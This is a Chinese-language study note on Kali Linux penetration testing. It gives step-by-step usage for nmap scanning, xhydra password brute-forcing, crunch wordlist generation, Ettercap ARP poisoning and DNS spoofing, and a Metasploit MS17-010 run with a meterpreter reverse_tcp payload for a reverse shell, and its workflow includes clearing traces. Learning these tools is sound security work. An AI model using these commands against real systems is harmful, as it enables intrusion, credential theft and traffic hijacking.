## Kali渗透

> 测试渗透步骤

```tex
1.确定要渗透的目标网站
2.收集目标网站的相关信息，比如操作系统，数据库，端口服务，所使用的脚本语言，子域名以及CMS系统等
3.漏洞探测，利用收集到的信息，寻找目标的脆弱点
4.漏洞利用，找到对方系统的弱点后，进一步攻克对方系统，拿到目标系统的权限
5.渗透目标内网的其他主机，把获得的目标权限作为跳板，进一步攻克内网其他主机
6.验证漏洞和修复漏洞
7.清除渗透痕迹，撰写测试报告
```

## nmap扫描

```tex
port:端口
state:端口状态
service:端口服务
open:端口开放的
closed:端口关闭的
filtered:端口被防火墙IDS/IPS屏蔽，无法确定状态
unfiltered:端口未被屏蔽，但是否开放需要进一步确认
open|filtered:端口是开放的或被过滤
closed|filteres:端口关闭或被过滤
```

> 用法

```tex
nmap -sS -sV -T4 ip
-sS 使用TCP SYN扫描
-sV 进行版本探测
-T4 使用的是一种快速扫描的方式 扫描速度的级别范围是在(T0-T5)之间，级别越高，扫描速度越快

nmap -A -T4 ip
-A 采用全面扫描的方式

nmap 192.168.31.0/24
扫描整个网段存活的主机 ， 扫描网络地址

nmap --top-ports 100 ip
--top-ports 100 扫描最有可能开放的100个端口

nmap --script=vuln ip
--script=vuln 根据脚本扫描常见漏洞  脚本vuln
```

## xhydra 爆破密码

```tex
对协议进行口令账号密码爆破
支持FTP,MYSQL,SMTP,TELNET,SSH等众多的协议爆破
```

```tex
xhydra 是hydra的图形化界面

**Target页面**
Single Target 目标IP地址填写，单个爆破目标
Target List IP地址列表添加 批量爆破时使用 只需要准备IP地址列表就可以了
port 爆破的端口号  默认的就可以
protocol 协议

output Options中勾选 Be Verbose 和 Show Attempts

**Passwords页面**
Username 账户名
Username List 当不知道账户名时，准备一个账户名字典进行爆破
Loop around users 使用账户字典时需要勾选

**Turning页面**
performance Options
	Number of tasks 设置线程数 一般设置10-50之间
```

## crunch生成字典

```tex
参数
min 设定最小字符串长度（必选）
max 设定最大字符串长度（必选）
-o  将生成的字典保存在指定文件中
-t  指定密码输出的格式
-p  指定元素组合

特殊字符
% 代表数字
^ 代表特殊符号
@  代表小写字母
，  代表大写字母

crunch 11 11 -t 1388888%%%% > mobile.txt 生成手机号

crunch 6 6 -f /usr/share/crunch/charset.lst hex-lower -o 3.txt
使用crunch的库文件charset.lst中的模板 hex-lower生成6位数的词典

crunch 6 6 0123456789 > 5.txt  使用0-9生成字典

crunch 3 3 -p zqd 1990 29 > 6.txt 生成这三个字符串组合的字典
```

## DNS劫持	Ettercap

> 启动网站服务apache2

```tex
systemctl start apache2
```

> 编辑dns文件

```tex
leafpad /etc/ettercap/etter.dns
```

![image-20211111101542108](C:\Users\zwj\AppData\Roaming\Typora\typora-user-images\image-20211111101542108.png)

注释这三条

![image-20211111101620904](C:\Users\zwj\AppData\Roaming\Typora\typora-user-images\image-20211111101620904.png)

增加两条，是发攻击的地址

```tex
ettercap -G

sniff -- unified snitting  -- eth0网卡
Hosts -- Scan for hosts扫描其他主机
Hosts -- Hosts list
网关地址添加到target1
目标地址添加到target2
Mitm --ARP poisoning
plugins --Manage the plugins --dns spoof双击

Start -start sniffing
```

![image-20211111102218489](C:\Users\zwj\AppData\Roaming\Typora\typora-user-images\image-20211111102218489.png)

## MSF (The Metasploit framework)

```tex
漏洞攻击工具，自带部分已知的软件漏洞的专业级漏洞工具
```

> 命令

```bash
#启动msf
msfconsole  
	# 模块
	exploits #利用漏洞进行攻击动作的模块
	auxiliary #负责信息收集、扫描、嗅探、指纹识别、口令猜测等功能的辅助模块，经常使用
	post #后渗透模块，经常使用
	payloads #代表成功执行exploits模块后，真正在目标系统执行的代码或指令，经常使用
	encoder #对payload加密的模块，使用较少
	nop #提高payload的稳定性模块，使用较少
	evasion #反杀毒软件的木马
#展示模块细节
show exploits
#通过漏洞名称搜索
search ms17-010
#使用
查询出后，use 序号，进入模块内部
#模块信息
info
#在模块信息中找到必须要设置的信息
set rhosts 192.168.31.64
#运行检测漏洞
run/exploit
#再次查询
search ms17-010
#使用payload
use 3
#info配置信息
set rhosts ip
#设置payload
set payload windows/x64/meterpreter/reverse_tcp
#查询payload信息
show options
#配置攻击机地址
set lhosts ip
#运行
run
#成功后获得反弹shell
```

## dirbuster

```tex
DirBuster是一个多线程的基于Java的应用程序设计用于暴力破解Web 应用服务器上的目录名和文件名的工具 
```

![image-20211115085959707](C:\Users\zwj\AppData\Roaming\Typora\typora-user-images\image-20211115085959707.png)

## kali自带字典

```tex
usr/share/dirbuster/wordlists
```

